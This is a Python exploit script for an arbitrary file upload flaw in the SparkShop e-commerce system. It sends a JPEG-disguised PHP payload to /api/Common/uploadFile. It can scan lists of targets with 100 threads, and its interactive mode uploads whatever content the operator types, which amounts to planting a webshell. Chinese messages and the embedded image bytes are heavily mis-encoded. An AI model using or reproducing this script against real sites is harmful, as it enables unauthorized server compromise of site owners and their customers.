# coding=gb2312
# -*- coding:utf-8 -*-
import sys,argparse,requests,re,json
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

???????  ?????? ????   ??????????  ?????? 
?????????????????????  ???????????????????
?????????????????????? ??????  ???????????
??????? ?????????????????????  ???????????
???     ???  ?????? ?????????????????  ???
???     ???  ??????  ???????????? ???  ???
                      author:panda
                      type:ÄÏ¾©ĞÇÔ´Í¼¿Æ¼¼_SparkShop_ÈÎÒâÎÄ¼şÉÏ´«Â©¶´
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="ÄÏ¾©ĞÇÔ´Í¼¿Æ¼¼_SparkShop_ÈÎÒâÎÄ¼şÉÏ´«Â©¶´")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/api/Common/uploadFile"
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    headers = {
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua-Mobile": "?0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/127.0.0.0Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip,deflate,br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Priority": "u=0,i",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
        "Content-Length": "4454"
    }
    data = """------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="file";filename="1.jpg"\r\n
??? JFIF      ?? ?        &""&0-0>>T         &""&0-0>>T??  ? ?" ??                 ??     ?  ? @    ?qt{?x~????????%VŞú¶¸f??php echo"hello"?>
^l? k??? ^z???8{*?sàî[?H?~C???-??$ ??C0Ò÷"??±³??~??    @   %????              ?? 
           ?Wíº?I;Ëç@?C?&????ïÂ?h r?f??8        ?? (        !  0P%@??  ? ?*T???T????*T???iR??U??:Ğñ¾§
??x?l×Îy`?b?J
?YqÇå &p÷ºC???6?;????D?WMK1x?_*T?%???2?X? ?Hu? ?¥Æz???C???ß±?;yÛ³???
??\
æ© h7w ?lÊªT???õå??¼Ï-?Q2??×ĞH?-J´ì??NoÑ¥???êèa? b¥¢??×£?{×¬¸ß??ã§ÈÛ?b_??d?b? &??I?=?R¸ù?.C???x?hä©?;D??????ãÏ?*T?$@j? ?Hr?X?9#?w)(I???xx?¹Ù?PE×§
$ÂÆÀÇ??T??N?    awŞû??5?x q±äu ?9
??1ÈéR?jÉÛİÂ{M?A:?vPÉãrY?xG»ë??·ßq?D?Z?n<?AàÉ&?"Ò²/C{?G=??g?,C·¬ô¿jå®èÈI?????X4?L<.8?8H8c??*T?8^>4?ÉÃ?????*T???T?????? <         !1A"2Qa0R?Bbqr?$3`?@CDSc???      ????7^L??À²?Yo??$áÀ?????????¡ª??ÌÈGU??+J¤°$?%BáÂ÷í¹·>Xn????ÓÀq]~M?¡®?/$:´°ÛÓ¡ÆcO>U??UX?H??????H?æ¼D?H;wB?c?h?}?>{c?h3zT">$??sëùc,????ÃÑ?1??????m|7ìÊgŞò??N??W?¥ó*?j#??ÛÔ??~??#????\:????i???`??¼®4e??o??>?=?£©?=????_ÓÔa?Tr?Gm{n<°Ã2??İü   ???f????E
MO ?lWQ?c$?tÙ¥qy[?9?q??8??¾£?<?OÀ¦ãô?d?d?B?<o"?C??Wg?zµù?½ÜZ?H??%>x?äÒ=Ş×???bBj?å¦???v6?Sq(?KIWc???|Jq?$t
Æ° @???i???????jC!??O!??60?á§¶à?ÛİÖÃJ??í÷(Üâ?bW(??ŞÇU¼ğ ?qLôµ?i4?*????51S$?åğ??±í@zQ? ??_§âpa? ?/§¤C???m??T??K?#D'èÔ??SJ???bf???÷Å]-U.s:S??4?.?x??Y)???{~x?zl?ËæZHàĞi?Ç¥ïŞ??4Ìöç¦0X? lg?Zæµ?>M6z5?D???6???è°d?cSnvr3????9??i£äY?kTAU6__%)?t???Òà??4sUÆ«WKT??Á®??c.y wìª?*?×äE?@?3?Zep?????"5.z??$U?o?<?e5t??'u??áÒ?Âê?)"??I??©Êh?g)(?/?w5<T?5gh?)?Mr???Ì¨?R?xe?i?w`P
?Q ????¥«?Pê¶25?=??? %        A?1?a q0@???  ??t?C?C??!????GH{D<£¤=£¹_?    ygI{d¼³¤½?Y??,?l?t?K?K???C??!????GH{D<£¤=?Q?ÑÜ? (9?òÎ??d??òÉ?Æã? F?1??R???sIygI{d¼³¤½³¹d<£§v?Äµh?BpáØ??0^º¡?ôÏ??²ïm?H<??eÑç?=»äN?E¾ù?    J_9M?B??(?h??u?í³ğè???O????,yv????U?Ëç?y?#?ÖÆf???S???vvvòËZ???~!/,?o????Æ¾Yo???§ßw???ZÙÇF}?u????o?_??äñ?i???V?n??<K?K???C???C?f??mi?Íı?<ÚâÄö? ?¤¸.QÛõSB}4/?G×¥???éì?yÌÅ'???Q~?GH{Gr?d???{ ?O
?)8A?i)Hé¦/J?]d??G?'??JE=?F½Òï¶!/?òÎ??d??W???? ?F?qŞÎÈß?n?Re7ä¦FHÅ´7Çß??:?b??#T?l?&?s?òÎ?Îå???yEP??lC? To????9?·óXn?-????JuÀÉ5?%??MYóÊñÏ\???áéÙß?r??? ? H???_"I?Éà??`K?K??%?òÎ??gI{d¼³¤½?Y?ÙÜ?Q??(?h?t?C?C??!?????  %?%?òÎ??gI{d¼³¤½?Y??,?l?ìö{=?g³Ùìö{=?g³Ùìö{??? &          !1A P#2abq?? ? ????Q??3R?D?Û®?e4?$,?21?????ÙÛ]?F?g?=???W??`?T$YB?P?VM
?;`g?4.cÒ»ëÈ m??1?ÆÜP??|?%P?eJ?ZÇ°?óİ{)ÖÛ?'? ?? +         !"1A a q2@PQ?? ? ?o}?ëë?2?LJ
??x?J?}4??O1>?Ñã?Ôö{ ih)d??? ÑİÈõ??!?.N??^????c-º®HK~?Õ¿*uWÄÕ?fZA[ö×ó¾????Ã¥????g???'?E  ?9ptã¨??
?5A??;,x?"?N@æÜÉÔ??b???Øªo 0N5??8?Dqs?w<a? ¶¤??]?ÑÏ??|?a$e$GPÊêy??%öá!?/?@=3?Óıt?\???ÆÕ??1U????\r\n
------WebKitFormBoundaryj7OlOPiiukkdktZR--
    """
    res1 = requests.get(url=target,verify=False,timeout=5)
    try:

        if res1.status_code==200:
            res2 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)

            if res2.status_code==200:
                res3 = json.loads(res2.text)
                if res3['msg']=="upload success":
                    return True
                else:
                    print(f"¸Ã[+]{target}²»´æÔÚÎÄ¼şÉÏ´«Â©¶´")
            else:
                print("·ÃÎÊ³¬Ê±£¬ÇëÊÖ¶¯²âÊÔ")
    except Exception as e:
        print(e)
def exp(target):
    while True:
        payload = "/api/Common/uploadFile"
        headers = {
            "Cache-Control": "max-age=0",
            "Sec-Ch-Ua-Mobile": "?0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/127.0.0.0Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip,deflate,br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Priority": "u=0,i",
            "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
            "Content-Length": "4454"
        }

        data = """------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name="file";filename="1.jpg"\r\n
        ??? JFIF      ?? ?        &""&0-0>>T         &""&0-0>>T??  ? ?" ??                 ??     ?  ? @    ?qt{?x~????????%VŞú¶¸f??php echo"hello"?>
        ^l? k??? ^z???8{*?sàî[?H?~C???-??$ ??C0Ò÷"??±³??~??    @   %????              ?? 
                   ?Wíº?I;Ëç@?C?&????ïÂ?h r?f??8        ?? (        !  0P%@??  ? ?*T???T????*T???iR??U??:Ğñ¾§
        ??x?l×Îy`?b?J
        ?YqÇå &p÷ºC???6?;????D?WMK1x?_*T?%???2?X? ?Hu? ?¥Æz???C???ß±?;yÛ³???
        ??\
        æ© h7w ?lÊªT???õå??¼Ï-?Q2??×ĞH?-J´ì??NoÑ¥???êèa? b¥¢??×£?{×¬¸ß??ã§ÈÛ?b_??d?b? &??I?=?R¸ù?.C???x?hä©?;D??????ãÏ?*T?$@j? ?Hr?X?9#?w)(I???xx?¹Ù?PE×§
        $ÂÆÀÇ??T??N?    awŞû??5?x q±äu ?9
        ??1ÈéR?jÉÛİÂ{M?A:?vPÉãrY?xG»ë??·ßq?D?Z?n<?AàÉ&?"Ò²/C{?G=??g?,C·¬ô¿jå®èÈI?????X4?L<.8?8H8c??*T?8^>4?ÉÃ?????*T???T?????? <         !1A"2Qa0R?Bbqr?$3`?@CDSc???      ????7^L??À²?Yo??$áÀ?????????¡ª??ÌÈGU??+J¤°$?%BáÂ÷í¹·>Xn????ÓÀq]~M?¡®?/$:´°ÛÓ¡ÆcO>U??UX?H??????H?æ¼D?H;wB?c?h?}?>{c?h3zT">$??sëùc,????ÃÑ?1??????m|7ìÊgŞò??N??W?¥ó*?j#??ÛÔ??~??#????\:????i???`??¼®4e??o??>?=?£©?=????_ÓÔa?Tr?Gm{n<°Ã2??İü   ???f????E
        MO ?lWQ?c$?tÙ¥qy[?9?q??8??¾£?<?OÀ¦ãô?d?d?B?<o"?C??Wg?zµù?½ÜZ?H??%>x?äÒ=Ş×???bBj?å¦???v6?Sq(?KIWc???|Jq?$t
        Æ° @???i???????jC!??O!??60?á§¶à?ÛİÖÃJ??í÷(Üâ?bW(??ŞÇU¼ğ ?qLôµ?i4?*????51S$?åğ??±í@zQ? ??_§âpa? ?/§¤C???m??T??K?#D'èÔ??SJ???bf???÷Å]-U.s:S??4?.?x??Y)???{~x?zl?ËæZHàĞi?Ç¥ïŞ??4Ìöç¦0X? lg?Zæµ?>M6z5?D???6???è°d?cSnvr3????9??i£äY?kTAU6__%)?t???Òà??4sUÆ«WKT??Á®??c.y wìª?*?×äE?@?3?Zep?????"5.z??$U?o?<?e5t??'u??áÒ?Âê?)"??I??©Êh?g)(?/?w5<T?5gh?)?Mr???Ì¨?R?xe?i?w`P
        ?Q ????¥«?Pê¶25?=??? %        A?1?a q0@???  ??t?C?C??!????GH{D<£¤=£¹_?    ygI{d¼³¤½?Y??,?l?t?K?K???C??!????GH{D<£¤=?Q?ÑÜ? (9?òÎ??d??òÉ?Æã? F?1??R???sIygI{d¼³¤½³¹d<£§v?Äµh?BpáØ??0^º¡?ôÏ??²ïm?H<??eÑç?=»äN?E¾ù?    J_9M?B??(?h??u?í³ğè???O????,yv????U?Ëç?y?#?ÖÆf???S???vvvòËZ???~!/,?o????Æ¾Yo???§ßw???ZÙÇF}?u????o?_??äñ?i???V?n??<K?K???C???C?f??mi?Íı?<ÚâÄö? ?¤¸.QÛõSB}4/?G×¥???éì?yÌÅ'???Q~?GH{Gr?d???{ ?O
        ?)8A?i)Hé¦/J?]d??G?'??JE=?F½Òï¶!/?òÎ??d??W???? ?F?qŞÎÈß?n?Re7ä¦FHÅ´7Çß??:?b??#T?l?&?s?òÎ?Îå???yEP??lC? To????9?·óXn?-????JuÀÉ5?%??MYóÊñÏ\???áéÙß?r??? ? H???_"I?Éà??`K?K??%?òÎ??gI{d¼³¤½?Y?ÙÜ?Q??(?h?t?C?C??!?????  %?%?òÎ??gI{d¼³¤½?Y??,?l?ìö{=?g³Ùìö{=?g³Ùìö{??? &          !1A P#2abq?? ? ????Q??3R?D?Û®?e4?$,?21?????ÙÛ]?F?g?=???W??`?T$YB?P?VM
        ?;`g?4.cÒ»ëÈ m??1?ÆÜP??|?%P?eJ?ZÇ°?óİ{)ÖÛ?'? ?? +         !"1A a q2@PQ?? ? ?o}?ëë?2?LJ
        ??x?J?}4??O1>?Ñã?Ôö{ ih)d??? ÑİÈõ??!?.N??^????c-º®HK~?Õ¿*uWÄÕ?fZA[ö×ó¾????Ã¥????g???'?E  ?9ptã¨??
        ?5A??;,x?"?N@æÜÉÔ??b???Øªo 0N5??8?Dqs?w<a? ¶¤??]?ÑÏ??|?a$e$GPÊêy??%öá!?/?@=3?Óıt?\???ÆÕ??1U????\r\n"""
        data1 = "\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--"
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080',
        }
        data2 = input("ÇëÊäÈëÒªÉÏ´«µÄÎÄ¼şÄÚÈİ(qÍË³ö)\n>>>>>>>>>>>>")
        res1 = requests.get(url=target, verify=False, timeout=5)
        try:
            if data2 == 'q':
                exit()
            if res1.status_code == 200:
                res2 = requests.post(url=target + payload, headers=headers, data=data+data2+data1, verify=False, timeout=5)
                if res2.status_code == 200:
                    res3 = json.loads(res2.text)
                    if res3['msg'] == "upload success":
                        print(f"ÎÄ¼ş³É¹¦ÉÏ´«µ½"+res3["data"]['url'])
                    else:
                        print(f"¸Ã[+]{target}²»´æÔÚÎÄ¼şÉÏ´«Â©¶´")
                else:
                    print("·ÃÎÊ³¬Ê±£¬ÇëÊÖ¶¯²âÊÔ")
        except Exception as e:
            print(e)
if __name__ == '__main__':
    main()